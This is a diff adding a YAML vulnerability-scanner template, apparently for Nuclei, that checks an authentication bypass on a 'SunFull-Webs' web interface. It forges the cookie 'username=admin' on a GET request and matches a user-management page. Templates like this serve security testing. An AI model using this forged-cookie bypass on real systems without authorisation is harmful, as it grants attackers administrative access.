@@ -1,0 +1,25 @@
+id: SunFull-Webs-login-bypass
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: GET方式直接访问，若是复现不成功，说明增加了部分鉴权，可以在cookie增加username=admin的项也可直接绕过登录界面。
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.html"
+    headers:
+      Cookie: username=admin     
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - '用户管理'
